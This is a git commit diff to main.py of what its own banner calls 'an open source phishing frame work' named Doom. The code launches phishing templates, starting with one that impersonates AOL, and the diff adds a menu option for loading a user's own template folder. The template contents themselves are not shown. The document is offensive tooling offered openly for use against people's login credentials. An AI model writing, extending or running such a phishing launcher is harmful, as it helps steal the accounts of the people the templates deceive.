7fda30524fc8944fe3d59c6eaf360f9ed6aeb6d3
Adam <adam.1man@aol.com>
2024-02-22 14:19:55 +0100

    Thank God
    always give thanks to God almighty.

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 print('Doom just gave birth to its first child, This is an open source phishing frame work.')
 print('creator H0x07')
 print('More phishing templates will be added enjoy.')
-print('To choose any template, eg Aol press 1 and hit enter\nUse ctrl c to end the program at anytime.\n\n')
+print('To choose any template, eg Aol press 1 and hit enter\nUse ctrl c to end the program at anytime.\n')
 #dooms child
 #started 21-Feb-2024
 import subprocess
@@ -13,12 +13,17 @@ def StartCli(template):
   
 
 def chooseTemplate():
-   choice = input('''1. Aol\n''')
+   choice = input('''1. Aol\n00. Use yours\n''')
    if choice == '1':
       Th = Thread(target=StartCli, args=('aol', ))
       Th.start()
-   else:print(choice)
+   elif choice == '00':
+      ur = input("Enter folder name: ")
+      Th = Thread(target=StartCli, args=(ur, ))
+      Th.start()
       
+   else:print(choice)
+     
 if __name__ == '__main__':
    Th = chooseTemplate()
    
